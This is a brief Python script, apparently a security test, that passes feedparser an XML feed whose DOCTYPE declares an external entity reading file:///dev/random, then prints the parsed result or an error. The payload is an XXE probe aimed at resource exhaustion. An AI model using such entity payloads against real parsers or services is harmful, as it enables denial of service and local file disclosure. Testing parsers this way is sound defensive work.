import feedparser

xml_data = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<feed>
  <title>Test Feed</title>
  <entry>
    <title>&xxe;</title>
    <content>Some content</content>
  </entry>
</feed>
"""

try:
    feed = feedparser.parse(xml_data)
    print(feed)
except Exception as e:
    print(f"An error occurred: {e}")